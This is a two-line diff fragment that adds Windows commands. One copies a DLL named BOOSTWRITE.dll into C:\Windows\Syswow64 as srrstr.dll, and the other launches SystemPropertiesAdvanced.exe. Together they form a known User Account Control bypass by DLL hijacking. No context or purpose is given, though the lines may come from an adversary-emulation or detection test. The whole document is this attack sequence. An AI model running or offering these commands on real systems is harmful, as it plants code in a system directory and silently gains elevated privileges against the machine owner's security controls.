@@ -1,0 +1,2 @@
+robocopy BOOSTWRITE.dll C:\\Windows\\Syswow64\\srrstr.dll &&
+cmd.exe /c "C:\\Windows\\Syswow64\\SystemPropertiesAdvanced.exe"
